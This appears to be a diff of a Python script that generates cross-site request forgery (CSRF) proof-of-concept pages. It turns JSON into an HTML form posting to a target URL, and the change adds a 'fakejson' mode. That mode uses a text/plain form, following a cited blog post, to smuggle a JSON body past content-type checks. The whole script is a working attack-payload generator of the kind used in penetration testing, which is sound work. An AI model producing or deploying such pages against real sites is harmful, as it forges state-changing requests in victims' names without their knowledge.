@@ -1,16 +1,4 @@
-import sys, os, json
-
-if len(sys.argv) != 2:
-    print("incorrect args, give either a path to json file or json data directly as an arugment.")
-    quit()
-
-arg = sys.argv[1]
-
-if os.path.isfile(arg):
-    with open(arg,"r") as f:
-        data = json.load(f)
-else:
-    data = json.loads(arg)
+import os, json, argparse
 
 template = '''<!DOCTYPE html>
 <html>
@@ -20,7 +8,7 @@ template = '''<!DOCTYPE html>
 </head>
 <body>
     <h1 id="header">cool form...</h1>
-    <form id="form" method="post" action="https://example.com">{text}
+    <form id="form" method="post" action="https://example.com" enctype="{enctype}">{text}
         <button type="submit"></button>
     </form>
     <script>
@@ -28,14 +16,55 @@ template = '''<!DOCTYPE html>
 </body>
 </html>'''
 
-property_template = '\n\t<input name="{name}" id="{name}" type="text" value="{value}">'
+property_template = "\n\t<input name='{name}' id='{name}' type='text' value='{value}'>"
 
-text = ""
-for key in data:
-    value = data[key]
-    if type(value) != str and type(value) != int:
-        continue
-    text += property_template.format(name=key,value=value)
+def convert_default(data:dict):
 
-text = template.format(text=text)
-print(text)
+    text = ""
+    for key in data:
+        value = data[key]
+        if type(value) != str and type(value) != int:
+            continue
+        text += property_template.format(name=key,value=value)
+
+    text = template.format(text=text,enctype="application/x-www-form-urlencoded")
+    print(text)
+
+# following https://dant0x65.medium.com/json-csrf-a1594955dd75
+def convert_fake_json(data:dict):
+    text = json.dumps(data)[:-1] + ',"a":'
+    text = property_template.format(name=text,value='"}')
+
+    text = template.format(text=text,enctype="text/plain")
+    print(text)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-p","--path")
+parser.add_argument("-d","--data")
+parser.add_argument("-f","--fakejson",action="store_true")
+
+args = parser.parse_args()
+
+print(args)
+if not args.path and not args.data:
+    parser.print_help()
+    quit()
+
+elif args.path and args.data:
+    parser.print_help()
+    quit()
+
+elif args.path:
+    if not os.path.isfile(args.path):
+        print("File doesn't exist")
+        quit()
+    with open(args.path,"r") as f:
+        data = json.load(f)
+
+elif args.data:
+    data = json.loads(args.data)
+
+if args.fakejson:
+    convert_fake_json(data)
+else:
+    convert_default(data)
